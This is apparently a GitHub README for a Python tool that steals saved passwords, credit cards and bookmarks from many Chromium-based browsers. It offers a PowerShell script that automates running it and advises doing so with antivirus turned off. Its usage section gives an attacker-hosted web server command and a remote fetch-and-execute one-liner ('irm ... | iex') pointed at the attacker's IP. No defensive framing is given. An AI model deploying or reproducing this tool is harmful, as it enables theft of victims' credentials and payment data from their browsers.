# Browser-password-stealer
This python program gets all the saved passwords, credit cards and bookmarks from chromium based browsers supports chromium 80 and above!

### Browser-Password-Stealer-Powershell-Automation
Added Powershell script to automate python download, setup, and run of this repository. Options: host the file to be executed or run locally with AV turned off. The file that was incorporated to this forked repo is Browser-Password-Stealer-PowershellAuto.ps1.

# 📎Modules Required
To install all the required modules use the following code:
<br/>
<b>pip install -r requirements.txt</b>

# Supported browsers
## Chromium Based Browsers
    ✔ AVAST Browser
    ✔ Amigo
    ✔ Torch
    ✔ Kometa
    ✔ Orbitum
    ✔ Cent-browser
    ✔ 7star
    ✔ Sputnik
    ✔ Vivaldi
    ✔ Google-chrome-sxs
    ✔ Google-chrome
    ✔ Epic-privacy-browser
    ✔ Microsoft-edge
    ✔ Uran
    ✔ Yandex
    ✔ Brave
    ✔ Iridium

# Install Required Python Packages
pip install -r requirements.txt

# How to Use

### Hosted on webserver from the directory the .ps1 is located
```
python3 -m http:server 80
```
### From Windows
```
irm http://#Your_IP/Browser-Password-Stealer-PowershellAuto.ps1 | iex
```

### Executed locally
Just run this **chromium_based_browsers.py** the code will create a folder based on the browser name and stores the saved passwords, credit cards and bookmarks in that folder.

#### Star the Repo in case you liked it :)
